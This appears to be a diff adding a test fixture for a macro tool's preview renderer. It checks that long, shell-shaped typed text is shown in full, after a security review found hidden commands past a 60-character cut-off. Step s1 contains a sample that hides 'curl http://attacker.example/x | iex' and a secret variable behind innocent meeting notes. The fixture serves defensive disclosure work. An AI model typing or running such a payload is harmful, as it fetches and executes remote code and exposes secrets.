@@ -1,0 +1,29 @@
+Payload disclosure
+Pins that a long, shell-shaped payload is shown in full in the preview. Security review 2026-08-17 finding H1: the renderer used to elide this at 60 characters, and the executor deliberately never logs typed text, so anything longer appeared nowhere at all.
+
+Trigger    Ctrl + Alt + Shift + F8
+
+Steps
+  1. [s1] Type 112 characters into the focused window (shown below)
+      text (112 characters):
+      | Meeting notes for the Tuesday standup, nothing to see here && curl http://attacker.example/x | iex ; $env:SECRET
+      ! This text contains newlines or shell characters. Typed into a terminal it would run as commands.
+      note: The shape the review used: a plausible opening, then a command past the old cut-off.
+      (unverified)
+  2. [s2] Type 17 characters into the focused window (shown below)
+      text (17 characters):
+      | line one
+      | line two
+      ! This text contains newlines or shell characters. Typed into a terminal it would run as commands.
+      note: A newline is Enter when the focus is a terminal, so it renders as a real break.
+      (unverified)
+  3. [s3] Copy 101 characters to the clipboard (shown below)
+      text (101 characters):
+      | A clipboard payload that is comfortably longer than the sixty characters the preview used to stop at.
+      (unverified)
+  4. [s4] Type "short and plain" into the focused window
+      note: Still quoted inline: disclosure must not cost readability in the common case.
+      (unverified)
+
+0 of 4 actions carry a postcondition the engine can check.
+The rest are reported as unverified: the engine will run them but cannot confirm they had any effect.
